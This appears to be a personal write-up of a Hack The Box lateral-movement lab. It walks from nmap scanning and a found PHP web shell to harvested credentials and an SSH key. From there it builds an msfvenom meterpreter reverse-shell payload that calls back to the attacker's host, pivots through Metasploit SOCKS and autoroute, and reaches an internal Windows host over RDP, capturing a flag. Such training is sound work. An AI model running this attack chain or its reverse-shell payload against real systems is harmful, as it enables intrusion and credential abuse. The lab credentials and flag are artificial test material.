Target IP
```go
10.129.229.129
```

## NMAP COMMAND
```go
nmap -sV -sC -A 10.129.229.129
```

Open ports
```go
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
```

```go
80/tcp open  http    Apache httpd 2.4.41
```

## Investigate NMAP output

NMAP output reveals the http-title to be `p0wny@shell`? 
```go
Nmap scan report for 10.129.229.129
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: p0wny@shell:~#
```

- Found on [GitHub](https://github.com/flozz/p0wny-shell), it's revealed to be a PHP shell.
- Web browse shows available via the browser
- Enumerating the directories, there are two user directories: `administrator` and `webadmin`, though only `webadmin` is available to us

>[!success] Enumerating the directories there is a note in `/home/webadmin/for-admin-eyes-only` stating the credentials needed to access server01 and other servers in the subnet

![[Pasted image 20241229165238.png]]

==Credential discovery #1==
^first-creds
Creds found for `server01` 
username ^325593
```
mlefay
```

password
```
Plain Human work!
```

#### p0wnyshell default creds found in script
![[p0wnyshell_creds.png]]

==Credential Discovery #2==
^second-creds
username
```go
p0wny
```
password
```go
shell
```

#### private_key found
Found the private key and it is readable!
![[HTB Field Manual/5-Lateral Movement/Skill Assessment/screenshots/private_key.png]]

## Pivot Host Compromise

- Copy the contents of the private key into `id_rsa`
- SSH into the web server with the private key and the `webadmin` username

SSH into the webserver
```go
ssh -i ~/.ssh/target_pvt_key webadmin@10.129.229.129
```

Ping sweep 
```go
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

IP of second host found 
```
172.16.5.35
```
![[host_discovery2.png]]

Generate msfvenom payload
```go
bundle exec msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.37 -f elf -o backupjob LPORT=8080
```

Copy backupjob to webadmin server
```go
scp -i ~/.ssh/target_pvt_key backupjob webadmin@10.129.229.129:/tmp
```

Configure the metasploit reverse_tcp payload
```go
use exploit/multi/handler
```

```go
set lhost 0.0.0.0
```

```go
set lport 8080
```

```go
set payload linux/x64/meterpreter/reverse_tcp
```

```go
run
```

Execute the `backupjob` payload on the pivot host, the meterpreter session will be established on the attack host.
![[initial_meterpreter_session.png]]

REMINDER
>[! Important] Second Host IP is 172.16.5.35

Facts:
- There is no route from my attack host to this internal subnet
- The pivot host has access to both the 172.16.5.0/23 range and the the 10.0.0.0/8 range
- I need to establish a local proxy on the attack host so that I can reach the 172.16.5.35 machine

### Configure MSF's SOCKS Proxy

>[! Warning] Before proceeding, ensure the line `socks4  127.0.0.1 9050` is present in `/etc/proxychains.conf`

Background the current mfs6 sessions with the `bg` command, then execute the following:

```go
use auxiliary/server/socks_proxy
```

```go
set SRVPORT 9050
```

```go
set SRVHOST 0.0.0.0
```

```go
set version 4a
```

```go
run
```

The msf6 socks_proxy module must route all traffic via the meterpreter session. Use the `post/multi/manage/autoroute` module to add routes for `172.16.5.0`

### Adding routes via AutoRoute Metasploit module

```go
use post/multi/manage/autoroute
```

```go
set SESSION 1
```

```go
set SUBNET 172.16.5.0
```

```go
run
```

After executing the run command, you should see output same as the below:
```go
msf6 post(multi/manage/autoroute) > run

[*] Running module against inlanefreight.local
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

If doing from the Meterpreter session...
```go
run autoroute -s 172.16.5.0/23
```

Scanning internal target 172.16.5.35 via proxychains
```go
proxychains nmap 172.16.5.35 -p3389 -sT -v -Pn
```

Output:
```go
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 12:55 EST
Initiating Parallel DNS resolution of 1 host. at 12:55
Completed Parallel DNS resolution of 1 host. at 12:55, 0.03s elapsed
Initiating Connect Scan at 12:55
Scanning 172.16.5.35 [1 port]
Completed Connect Scan at 12:56, 2.00s elapsed (1 total ports)
Nmap scan report for 172.16.5.35
Host is up.

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
```

This shows port 3389 is filtered. Attempt a remote session to the Windows target via xfreerdp

RDP into Windows target using the creds from [[#^325593 | first creds found]] 
```go
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:Plain Human work!
```

Flag Acquired
```go
S1ngl3-Piv07-3@sy-Day
```
![[HTB Field Manual/5-Lateral Movement/Skill Assessment/screenshots/flag.png]]

